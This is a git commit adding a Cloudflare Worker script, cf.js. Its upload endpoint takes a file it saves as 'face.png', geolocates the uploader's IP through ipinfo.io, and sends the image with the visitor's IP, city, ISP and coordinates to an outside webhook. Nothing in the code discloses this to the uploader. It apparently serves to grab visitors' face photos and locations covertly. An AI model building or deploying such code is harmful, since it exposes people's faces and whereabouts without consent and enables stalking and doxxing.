37883f9d01721f44351c9ffdcb834963d320645b
resurface1 <185619954+resurface1@users.noreply.github.com>
2025-04-29 18:51:36 +0900

    cf

---
+++ cf.js
@@ -0,0 +1,41 @@
+import { Hono } from "hono";
+import dotenv from "dotenv";
+import { getConnInfo, serveStatic } from "hono/cloudflare-workers";
+dotenv.config();
+
+const app = new Hono();
+
+app.post("/upload", async (c) => {
+  const formData = await c.req.formData();
+  const file = formData.get("file");
+  const info = getConnInfo(c);
+  if (!file) {
+    return c.text("No file uploaded", 400);
+  }
+
+  const ip = process.env["USE_X_FORWARDED_FOR"] === "true" ? c.req.header("cf-connecting-ip").split(",")[0].trim() : info.remote.address;
+
+  const ipInfoJson = await (await fetch(`https://ipinfo.io/${ip}/json`)).json();
+
+  const message = `IP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\位置: ${ipInfoJson.loc}`;
+
+  const buffer = await file.arrayBuffer();
+
+  const fd = new FormData();
+  fd.append("file", new Blob([buffer]), "face.png");
+  fd.append("payload_json", JSON.stringify({ content: message }));
+
+  const response = await fetch(process.env.WEBHOOK_URL, {
+    method: "POST",
+    body: fd,
+  });
+  if (!response.ok) {
+    return c.text("Failed to upload file", 500);
+  }
+
+  return c.text("Done");
+});
+
+app.get('*', serveStatic({ root: './dist' }));
+
+export default app;
